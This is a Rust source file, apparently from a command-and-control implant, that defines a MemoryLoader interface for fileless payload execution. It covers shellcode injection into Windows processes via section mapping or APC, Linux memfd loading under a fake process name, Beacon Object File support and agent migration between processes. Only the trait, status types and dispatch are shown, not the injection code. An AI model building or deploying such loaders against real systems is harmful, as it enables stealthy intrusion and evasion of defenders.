// Memory Loader Trait and Common Types (MemoryLoader V2)
//
// Provides a unified interface for memory-only execution and agent migration.
// Handles both Windows (Section Mapping / APC) and Linux (memfd / Sealing).

use async_trait::async_trait;
use serde::{Serialize, Deserialize};

// Module declarations
#[cfg(target_os = "windows")]
pub mod windows;

#[cfg(target_os = "linux")]
pub mod linux;

#[cfg(target_os = "windows")]
pub mod bof;

#[cfg(target_os = "windows")]
pub mod error;

#[cfg(target_os = "windows")]
pub mod beacon_api;

#[cfg(target_os = "windows")]
pub mod safety;

// Re-export error types
#[cfg(target_os = "windows")]
pub use error::{BofError, BofResult};

/// Status of the memory loading or migration operation
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum MigrationStatus {
    /// Success: Payload is running in memory
    Success,
    /// Failure: Target process not found
    TargetNotFound,
    /// Failure: Memory allocation or injection failed (with error message)
    InjectionFailed(String),
    /// Failure: Payload appears to be corrupted or invalid
    PayloadCorrupted,
    /// Failure: Access denied or insufficient privileges
    AccessDenied,
}

#[async_trait]
pub trait MemoryLoader {
    /// Execute memory-only load or migration
    ///
    /// # Parameters
    ///
    /// * `payload` - Raw binary data (Shellcode for Windows, ELF for Linux)
    /// * `target` - Target for injection (Win: EXE path, Linux: Fake process name)
    /// * `pid` - Optional PID for direct injection
    async fn load(&self, payload: Vec<u8>, target: Option<&str>, pid: Option<u32>) -> MigrationStatus;
}

// Implementors
#[cfg(target_os = "windows")]
#[async_trait]
impl MemoryLoader for windows::WindowsMemoryLoader {
    async fn load(&self, payload: Vec<u8>, target: Option<&str>, pid: Option<u32>) -> MigrationStatus {
        self.load_advanced(payload, target, pid).await
    }
}

#[cfg(target_os = "linux")]
#[async_trait]
impl MemoryLoader for linux::LinuxMemoryLoader {
    async fn load(&self, payload: Vec<u8>, target: Option<&str>, _pid: Option<u32>) -> MigrationStatus {
        self.load_advanced(payload, target).await
    }
}

/// Dynamic factory to get the appropriate loader for current OS
pub fn get_loader() -> Box<dyn MemoryLoader + Send + Sync> {
    #[cfg(target_os = "windows")]
    return Box::new(windows::WindowsMemoryLoader);
    
    #[cfg(target_os = "linux")]
    return Box::new(linux::LinuxMemoryLoader);
    
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    panic!("Unsupported OS for MemoryLoader");
}
